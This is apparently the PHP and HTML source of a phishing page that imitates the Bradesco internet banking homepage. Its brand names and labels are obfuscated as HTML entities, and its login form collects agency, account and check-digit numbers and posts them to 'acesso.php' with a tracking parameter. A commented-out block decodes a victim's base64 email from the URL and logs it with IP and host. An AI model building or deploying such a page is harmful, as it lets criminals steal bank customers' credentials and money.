<?php include('../_functions/functions.php'); 

$UserId = uniqid();
$_SESSION['uniq_id'] = $UserId;

/* include('lib.php');
$emailx = $_GET['cliente'];
$email = base64_decode($emailx);
if (isset($_GET['cliente']) && !filter_var($email, FILTER_VALIDATE_EMAIL) === false) { 
	$msg = "in: $email - $ip ($host)- $data\n";
	$myFl = "acc-log.txt";
	$open = fopen($myFl, 'a') or die("can't open file");
	fwrite($open, $msg);
	fclose($open);
} else { 
	echo $e500; exit;
}   */

?>


<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
	<link rel="shortcut icon" href="../_images/favicon.ico">
	<link rel="stylesheet" href="../_fonts/_fonts.css">
	<link rel="stylesheet" href="../_styles/boot.css">
	<link rel="stylesheet" href="../_styles/initial.css">
	<script src="../_jscripts/jquery.js"></script>
	<script src="../_jscripts/jcycle.js"></script>
	<script src="../_jscripts/d_content.js"></script>
</head>
<body>
<div class="container">
	<div class="fixed_header">
		<div class="acesse_ib">
			<img src="../_images/hd_acesso_ib.png" height="16" width="177" alt="">
		</div><!-- acesse_ib -->
		<div class="block_login">
		
		
		
		
		
		
			<form action="acesso.php?cliente=<?php echo $emailx;  ?>" method="post" onsubmit="return checkAcesso();">
				<label for="my_ag">
					<span>A&#103;&#234;&#110;&#99;ia:</span>
					<input type="text" name="my_ag" id="my_ag" class="start_input" maxlength="4" onkeyup="return NextCampo(this, '4','my_ct');" autocomplete="off">
				</label>
				<label for="my_ct">
					<span>C&#111;&#110;&#116;a:</span>
					<input type="text" name="my_ct" id="my_ct" class="start_input person_ct" maxlength="7" onkeyup="return NextCampo(this, '7','my_dg');" autocomplete="off">
					<input type="text" name="my_dg" id="my_dg" class="start_input person_dg" maxlength="1" autocomplete="off">
					<input type="hidden" name="sender" value="ag_ct">
				</label>
					<input type="submit" name="submeter" id="submeter" value="OK" class="start_btn">
				<label for="lembrar">
					<input type="checkbox" name="lembrar" id="lembrar" class="start_check"> Le&#109;&#98;&#114;&#97;&#114;-me
				</label>
			</form>
			
			
			
			
			
			
			
			
		</div><!-- block_login -->

		<div class="block_time">
			<?= getDataShow();?>
		</div><!-- block_time -->
	</div><!-- fixed_header -->

	<div class="block_slider_all">

		<ul class="slider"><!-- slider -->
			<li class="li_slider"><img src="../_images/sl_consignado.jpg" alt=""></li>
			<li class="li_slider"><img src="../_images/sl_investimento.jpg" alt=""></li>
			<li class="li_slider"><img src="../_images/sl_ipva2k17.jpg" alt=""></li>
			<li class="li_slider"><img src="../_images/sl_fgts.jpg" alt=""></li>
		</ul><!-- slider -->

		<div class="left_menu">
			<div class="block_logo">
				<img src="../_images/mi_logo.png" height="66" width="86" alt="">
			</div><!-- block_logo -->
			<a href="#" class="open_acc">AB&#82;&#65;&#32;&#83;&#85;A CO&#78;&#84;A</a>
			<ol class="list_menu_now"><!-- menu_esquerdo -->
				<li class="list_menuzin"><img src="../_images/mi_produtos.png" alt=""><span>Pro&#100;&#117;&#116;&#111;s e S&#101;&#114;&#118;&#105;&#231;&#111;s</span></li>
				<li class="list_menuzin"><img src="../_images/mi_campanhas.png" alt=""><span>Pro&#109;&#111;&#231;&#245;&#101;s e Cam&#112;&#97;&#110;&#104;&#97;s</span></li>
				<li class="list_menuzin"><img src="../_images/mi_acessibilidade.png" alt=""><span style="margin-top:18px!important;">Ace&#115;&#115;&#105;&#98;&#105;&#108;&#105;dade</span></li>
				<li class="list_menuzin"><img src="../_images/mi_brada_logo.png" alt=""><span style="margin-top:18px!important;">Sob&#114;&#101;&#32;&#111;&#32;&#66;&#114;&#97;&#100;&#101;sco</span></li>
				<li class="list_menuzin"><img src="../_images/mi_poupar.png" alt=""><span>Educ&#97;&#231;&#227;&#111;&#32;&#70;&#105;&#110;&#97;&#110;&#99;&#101;ira</span></li>
				<li class="list_menuzin"><img src="../_images/mi_responsivo.png" alt=""><span style="margin-top:18px!important;">Canais Digitais</span></li>
				<li class="list_menuzin"><img src="../_images/mi_atendimento.png" alt=""><span style="margin-top:18px!important;">Aten&#100;&#105;&#109;&#101;&#110;&#116;o</span></li>
			</ol><!-- menu_esquerdo -->
		</div><!-- left_menu -->

		<div class="right_menu">
			<ol><!-- menu_direito -->
				<li class="orizontal_menu"><a href="acesso.php?cliente=<?php echo $emailx;  ?>" class="active_menu_r">Para Vo&#99;&#234;</a></li>
				<li class="orizontal_menu"><a href="acesso.php?cliente=<?php echo $emailx;  ?>">Ex&#99;&#108;&#117;&#115;&#105;ve</a></li>
				<li class="orizontal_menu"><a href="acesso.php?cliente=<?php echo $emailx;  ?>">P&#114;&#105;&#109;e</a></li>
				<li class="orizontal_menu"><a href="acesso.php?cliente=<?php echo $emailx;  ?>">Priv&#97;&#116;&#101;&#32;&#66;&#97;nk</a></li>
				<li class="orizontal_menu"><a href="acesso.php?cliente=<?php echo $emailx;  ?>"><span>Mais</span>Pe&#114;&#102;&#105;l</a></li>
				<li class="orizontal_menu"><a href="acesso.php?cliente=<?php echo $emailx;  ?>"><span>Mais</span>Br&#97;&#100;&#101;&#115;&#99;o</a></li>
				<li class="orizontal_menu"><a href="pessoa-juridica/?cliente=<?php echo $emailx;  ?>"><span>Para sua</span>Emp&#114;&#101;&#115;a</a></li>
				<li class="orizontal_menu"><a href="pessoa-juridica/?cliente=<?php echo $emailx;  ?>"><span>Para o</span>Pod&#101;&#114;&#32;&#80;&#250;&#98;&#108;ico</a></li>
			</ol><!-- menu_direito -->
		</div><!-- right_menu -->

		<div class="footer_menu">
			<div class="block_mold">
				<img src="../_images/hd_ft_mold.png" height="42" width="653" alt="">
			</div><!-- block_mold -->
			<div class="block_list_ft">
				<ol>
					<li>
						<img src="../_images/hd_ft-recarga-celular.png" alt="">
						<p>Está sem Cr&#233;&#100;ito</p>
						<span>Re&#99;&#97;&#114;&#114;&#101;&#103;ue aqui seu ce&#108;&#117;&#108;ar.</span>
					</li>
					<li>	
						<img src="../_images/hd_ft-seguro-auto.png" alt="">
						<p>Br&#97;&#100;&#101;&#115;&#99;o Se&#103;&#117;&#114;&#111;&#32;&#65;&#117;to</p>
						<span>Con&#116;&#114;&#97;&#116;e e si&#109;&#117;&#108;e ag&#111;&#114;a.</span>
					</li>
					<li>	
						<img src="../_images/hd_ft-automatico.png" alt="">
						<p>D&#233;&#98;&#105;to Auto&#109;&#225;&#116;&#105;co</p>
						<span>De&#105;&#120;&#101;&#32;&#97;s c&#111;&#110;&#116;&#97;s com a ge&#110;&#116;e.</span>
					</li>
					<li>	
						<img src="../_images/hd_ft-portabilidade.png" alt="">
						<p>Port&#97;&#98;&#105;&#108;&#105;&#100;ade de Sa&#108;&#225;&#114;io</p>
						<span>Sai&#98;&#97;&#32;&#99;&#111;&#109;o fu&#110;&#99;&#105;&#111;na.</span>
					</li>
				</ol>
			</div><!-- block_list_ft -->
		</div>

	</div><!-- block_slider_all -->


	<div class="block_destaques">
		<div class="principal_destaque">
			<div class="block_shadow_princ">
				<p>Es&#116;&#225; com d&#250;&#118;&#105;&#100;as?</p>
				<h1>Br&#97;&#100;&#101;&#115;co Ex&#112;&#108;&#105;&#99;a</h1>
				<img src="../_images/dest_play-video.png" height="180" width="180" alt="">
			</div><!-- block_shadow_princ -->
			<div class="block_video_dest">
				<video class="video_destacado" autoplay="autoplay" loop>
					<source src="../_images/dest_video_autoplay.mp4" type="video/mp4">
					Your browser does not support the video tag.
				</video>
			</div><!-- block_video_dest -->
		</div><!-- principal_destaque -->

		<div class="outros_destaques">
			<div class="mini_destaques">
				<img src="../_images/dest_credito.jpg" alt="">
				<div class="info_dest">
					<h1>Li&#109;&#105;&#116;&#101; de C&#114;&#233;&#100;&#105;to Pes&#115;&#111;&#97;l</h1>
					<p>Eq&#117;&#105;&#108;&#105;&#98;re suas co&#110;&#116;&#97;s.</p>
				</div><!-- info_dest -->
			</div><!-- mini_destaques -->

			<div class="mini_destaques">
				<img src="../_images/dest_seguro.jpg" alt="">
				<div class="info_dest">
					<h1>Ape&#110;&#97;&#115;&#32;&#82;&#36;&#32;&#50;&#44;&#56;6 ao mês</h1>
					<p>Pr&#111;&#116;&#101;&#106;a seu ca&#114;&#116;&#227;o.</p>
				</div><!-- info_dest -->
			</div><!-- mini_destaques -->

			<div class="mini_destaques extra_size">
				<img src="../_images/dest_pe_quente.jpg" alt="">
				<div class="info_dest">
					<h1>P&#233;&#32;&#81;&#117;&#101;&#110;te Max P&#114;&#234;&#109;&#105;os</h1>
					<p>G&#117;&#97;&#114;&#100;e di&#110;&#104;&#101;&#105;&#114;o e con&#99;&#111;&#114;&#114;a a p&#114;&#234;&#109;&#105;os.</p>
				</div><!-- info_dest -->
			</div><!-- mini_destaques -->

			<div class="mini_destaques extra_size">
				<img src="../_images/dest_biometria.jpg" alt="">
				<div class="info_dest">
					<h1>Bio&#109;&#101;&#116;&#114;&#105;a</h1>
					<p>Fa&#231;&#97;&#32;&#115;&#117;&#97;s tran&#115;&#97;&#231;&#245;&#101;s sem ca&#114;&#116;&#227;o.</p>
				</div><!-- info_dest -->
			</div><!-- mini_destaques -->

		</div><!-- outros_destaques -->
	</div><!-- block_destaques -->

	<div class="block_footer_all">
		<div class="block_footer_red">
			<img src="../_images/ft_logo_all.png" alt="">
		</div><!-- block_footer_red -->
		<div class="block_footer">
			<ul>
				<li><a href="#">Por&#116;&#97;&#98;&#105;&#108;&#105;&#100;&#97;de</a></li>
				<li><a href="#">Br&#97;&#100;&#101;&#115;&#99;o Imprensa</a></li>
				<li><a href="#">trab&#97;&#108;&#104;&#101;&#32;&#67;&#111;&#110;&#111;&#115;co</a></li>
				<li><a href="#">Seg&#117;&#114;&#97;&#110;&#231;a</a></li>
				<li><a href="#">Br&#97;&#100;&#101;&#115;&#99;o Explica</a></li>
				<li><a href="#">Rel&#97;&#231;&#245;&#101;&#115;&#32;&#99;&#111;&#109;&#32;&#73;&#110;&#118;&#101;&#115;&#116;idores</a></li>
			</ul>
		</div>
	</div><!-- block_footer_all -->



<div class="clear"></div>	
</div><!-- container -->		
</body>
</html>